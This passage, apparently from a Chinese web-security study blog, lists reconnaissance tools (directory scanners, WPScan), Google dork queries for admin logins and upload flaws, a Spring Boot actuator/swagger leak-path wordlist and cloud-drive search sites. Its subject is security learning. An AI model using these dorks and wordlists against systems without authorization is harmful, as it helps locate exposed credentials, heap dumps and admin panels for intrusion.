<h1 id="6敏感目录信息目录扫描"><a class="markdownIt-Anchor" href="#6敏感目录信息目录扫描"></a> 6.敏感目录信息/目录扫描</h1>
<h2 id="御剑目录扫描工具"><a class="markdownIt-Anchor" href="#御剑目录扫描工具"></a> 御剑目录扫描工具</h2>
<p><a href="https://github.com/shenyushun/py-webscanner">shenyushun/py-webscanner: 练手写的网站后台扫描器，字典在御剑基础上新增了一些，共1097802条不重复数据。 (github.com)</a></p>
<h2 id="bbscan"><a class="markdownIt-Anchor" href="#bbscan"></a> BBscan</h2>
<p><a href="https://github.com/lijiejie/BBScan">lijiejie/BBScan: A fast vulnerability scanner (github.com)</a></p>
<p>使用：py -2 <a href="http://BBScan.py">BBScan.py</a> -f url.txt</p>
<h2 id="drib"><a class="markdownIt-Anchor" href="#drib"></a> Drib</h2>
<p>Kal集成工具，使用方式：</p>
<p>使用：dirb+url</p>
<h2 id="wpscan-针对wordpress的漏洞扫描工具"><a class="markdownIt-Anchor" href="#wpscan-针对wordpress的漏洞扫描工具"></a> Wpscan-针对wordpress的漏洞扫描工具</h2>
<p>需要通过在线识别工具查询 <a href="https://xxx.xn--comcmswordpress-o53xt321c">https://xxx.com的cms为wordpress</a>。</p>
<h1 id="7google-语法查询"><a class="markdownIt-Anchor" href="#7google-语法查询"></a> 7.Google 语法查询</h1>
<p><strong>google hack****快速生成小工具：</strong></p>
<p><a href="http://www.0xby.com/g.html">http://www.0xby.com/g.html</a></p>
<p>inurl://admin/login.php 查找管理员登录页面</p>
<p>inurl:/phpmyadmin/index.php  查找后台数据库管理页面</p>
<p>inurl:Login admin 返回url中含有 Login 和 admin 的网页</p>
<p>site:baidu.com inurl:Login  <a href="http://xn--baidu-yu8hu7q.com">只在baidu.com</a> 中查找url中含有 Login的网页</p>
<p>site:baidu.com filetype:pdf  只返回baidu.com站点上文件类型为pdf的网页</p>
<p>link:www.baidu.com  返回所有包含指向 <a href="http://www.baidu.com">www.baidu.com</a> 的网页</p>
<p>related:www.llhc.edu.cn 返回与 <a href="http://www.llhc.edu.cn">www.llhc.edu.cn</a> 网页布局相似的页面</p>
<p>info:www.baidu.com 返回百度的一些信息</p>
<p>define:Hacker 返回关于Hacker的定义</p>
<p>site:xx.com intext:管理 site:xx.com inurl:login site:xx.com intitle:后台   查找网站后台</p>
<p>site:xx.com filetype:php 查看服务器使用的程序</p>
<p>site:xx.com inurl:file site:xx.com inurl:load 查看上传漏洞</p>
<h1 id="8信息泄漏"><a class="markdownIt-Anchor" href="#8信息泄漏"></a> 8.信息泄漏</h1>
<h2 id="spring-boot信息泄露字典"><a class="markdownIt-Anchor" href="#spring-boot信息泄露字典"></a> spring boot信息泄露字典</h2>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/%20/</span>swagger-ui.html <br>/actuator <br><span class="hljs-regexp">/actuator/</span>auditevents <br><span class="hljs-regexp">/actuator/</span>beans <br><span class="hljs-regexp">/actuator/</span>conditions <br><span class="hljs-regexp">/actuator/</span>configprops <br><span class="hljs-regexp">/actuator/</span>env <br><span class="hljs-regexp">/actuator/</span>health <br><span class="hljs-regexp">/actuator/</span>heapdump <br><span class="hljs-regexp">/actuator/</span>httptrace <br><span class="hljs-regexp">/actuator/</span>hystrix.stream <br><span class="hljs-regexp">/actuator/i</span>nfo <br><span class="hljs-regexp">/actuator/</span>jolokia <br><span class="hljs-regexp">/actuator/</span>logfile <br><span class="hljs-regexp">/actuator/</span>loggers <br><span class="hljs-regexp">/actuator/m</span>appings <br><span class="hljs-regexp">/actuator/m</span>etrics <br><span class="hljs-regexp">/actuator/</span>scheduledtasks <br><span class="hljs-regexp">/actuator/</span>swagger-ui.html <br><span class="hljs-regexp">/actuator/</span>threaddump <br><span class="hljs-regexp">/actuator/</span>trace <br>/api.html <br><span class="hljs-regexp">/api/i</span>ndex.html <br><span class="hljs-regexp">/api/</span>swagger-ui.html <br><span class="hljs-regexp">/api/</span>v2/api-docs <br>/api-docs <br>/auditevents <br>/autoconfig <br>/beans <br>/caches <br>/cloudfoundryapplication <br>/conditions <br>/configprops <br><span class="hljs-regexp">/distv2/i</span>ndex.html <br>/docs <br><span class="hljs-regexp">/druid/i</span>ndex.html <br><span class="hljs-regexp">/druid/</span>login.html <br><span class="hljs-regexp">/druid/</span>websession.html <br><span class="hljs-regexp">/dubbo-provider/</span>distv2/index.html <br>/<span class="hljs-keyword">dump</span> <br><span class="hljs-regexp">/entity/</span>all <br>/env <br><span class="hljs-regexp">/env/</span>(name) <br>/eureka <br>/flyway <br><span class="hljs-regexp">/gateway/</span>actuator <br><span class="hljs-regexp">/gateway/</span>actuator/auditevents <br><span class="hljs-regexp">/gateway/</span>actuator/beans<br><span class="hljs-regexp">/gateway/</span>actuator/conditions <br><span class="hljs-regexp">/gateway/</span>actuator/configprops <br><span class="hljs-regexp">/gateway/</span>actuator/env <br><span class="hljs-regexp">/gateway/</span>actuator/health <br><span class="hljs-regexp">/gateway/</span>actuator/heapdump <br><span class="hljs-regexp">/gateway/</span>actuator/httptrace <br><span class="hljs-regexp">/gateway/</span>actuator/hystrix.stream <br><span class="hljs-regexp">/gateway/</span>actuator/info <br><span class="hljs-regexp">/gateway/</span>actuator/jolokia <br><span class="hljs-regexp">/gateway/</span>actuator/logfile <br><span class="hljs-regexp">/gateway/</span>actuator/loggers <br><span class="hljs-regexp">/gateway/</span>actuator/mappings <br><span class="hljs-regexp">/gateway/</span>actuator/metrics <br><span class="hljs-regexp">/gateway/</span>actuator/scheduledtasks <br><span class="hljs-regexp">/gateway/</span>actuator/swagger-ui.html <br><span class="hljs-regexp">/gateway/</span>actuator/threaddump <br><span class="hljs-regexp">/gateway/</span>actuator/trace <br>/health <br>/heapdump <br>/heapdump.json <br>/httptrace <br>/hystrix <br>/hystrix.stream <br>/info <br>/intergrationgraph <br>/jolokia <br><span class="hljs-regexp">/jolokia/</span>list <br>/liquibase <br>/logfile <br>/loggers <br>/mappings <br>/metrics <br>/monitor <br>/prometheus <br>/refresh <br>/scheduledtasks <br>/sessions <br>/shutdown <br><span class="hljs-regexp">/spring-security-oauth-resource/</span>swagger-ui.html <br><span class="hljs-regexp">/spring-security-rest/</span>api/swagger-ui.html <br><span class="hljs-regexp">/static/</span>swagger.json <br><span class="hljs-regexp">/sw/</span>swagger-ui.html <br>/swagger <br><span class="hljs-regexp">/swagger/</span>codes <br><span class="hljs-regexp">/swagger/i</span>ndex.html <br><span class="hljs-regexp">/swagger/</span><span class="hljs-keyword">static</span>/index.html <br><span class="hljs-regexp">/swagger/</span>swagger-ui.html <br><span class="hljs-regexp">/swagger-dubbo/</span>api-docs <br>/swagger-ui <br>/swagger-ui.html<br><span class="hljs-regexp">/swagger-ui/</span>html <br><span class="hljs-regexp">/swagger-ui/i</span>ndex.html <br><span class="hljs-regexp">/system/</span>druid/index.html <br><span class="hljs-regexp">/template/</span>swagger-ui.html <br>/threaddump <br>/trace <br><span class="hljs-regexp">/user/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.1/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.2/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.3/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.4/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.5/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.6/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.7/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.8/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.9/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.0/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.1/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.2/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.3/</span>swagger-ui.html <br><span class="hljs-regexp">/v2/</span>swagger.json <br><span class="hljs-regexp">/webpage/</span>system<span class="hljs-regexp">/druid/i</span>ndex.html <br><br></code></pre></td></tr></table></figure>
<h2 id="网盘信息泄漏"><a class="markdownIt-Anchor" href="#网盘信息泄漏"></a> 网盘信息泄漏</h2>
<p>凌风云：<a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p>
<p>蓝菊花：<a href="http://www.lanjuhua.com/">http://www.lanjuhua.com/</a></p>
<p>大力盘：<a href="https://www.dalipan.com/">https://www.dalipan.com/</a></p>
<p>猪猪盘：<a href="http://www.zhuzhupan.com/">http://www.zhuzhupan.com/</a></p>
<p>PanSou：<a href="http://www.pansou.com/">http://www.pansou.com/</a></p>
<p>盘飞飞：<a href="https://panfeifei.com/">https://panfeifei.com/</a></p>
]]></content>
      <categories>
        <category>web学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
      </tags>
  </entry>
</search>
